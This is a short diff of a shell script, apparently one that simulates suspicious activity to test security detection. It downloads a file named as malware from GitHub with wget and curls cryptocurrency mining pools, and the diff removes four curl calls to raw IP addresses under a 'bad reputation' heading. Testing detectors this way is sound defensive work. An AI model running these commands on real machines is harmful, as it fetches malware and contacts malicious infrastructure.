@@ -8,10 +8,6 @@ gcc /home/app/main2.c -o /home/app/main2.o
 wget https://github.com/FaridArbai/mws/raw/master/original_malware_433
 
 # Bad reputation communication
-curl 141.98.10.57 &
-curl 192.241.217.0 &
-curl 199.19.226.13 &
-curl 111.7.96.0 &
 curl us-west.minexmr.com &
 curl pool.minexmr.com &
 curl br.stratum.slushpool.com:3333 &
